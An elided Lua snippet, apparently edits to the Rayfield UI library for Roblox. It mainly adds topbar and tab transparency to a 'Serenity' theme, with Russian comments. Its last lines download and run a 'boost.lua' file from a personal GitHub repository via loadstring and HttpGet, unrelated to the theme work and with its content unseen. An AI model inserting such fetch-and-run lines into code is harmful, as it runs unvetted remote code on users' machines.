...
local RayfieldLibrary = {
    ...
    Theme = {
        Serenity = {
            ...
            TopbarBackgroundTransparency = 0.5,  -- Добавлено: прозрачность верхней панели
...
local SelectedTheme = RayfieldLibrary.Theme.Serenity  -- Изменено для использования темы Serenity
...
local function ChangeTheme(Theme)
    ...
    Rayfield.Main.BackgroundTransparency = SelectedTheme.BackgroundTransparency  -- Убедитесь, что это установлено
    Rayfield.Main.Topbar.BackgroundColor3 = SelectedTheme.Topbar
    Rayfield.Main.Topbar.BackgroundTransparency = SelectedTheme.TopbarBackgroundTransparency  -- Добавлено: прозрачность верхней панели

    -- Применение темы к другим элементам
    for _, tabbtn in ipairs(TabList:GetChildren()) do
        if tabbtn.ClassName == "Frame" and tabbtn.Name ~= "Placeholder" then
            tabbtn.BackgroundTransparency = SelectedTheme.TabBackgroundTransparency  -- Убедитесь, что это установлено
        end
    end

    -- Другие элементы интерфейса также могут потребовать установки прозрачности
end
...
if not useStudio then
	local success, result = pcall(function()
		loadstring(game:HttpGet('https://raw.githubusercontent.com/Im-TooGreeK/test/refs/heads/main/boost.lua'))()
	end)
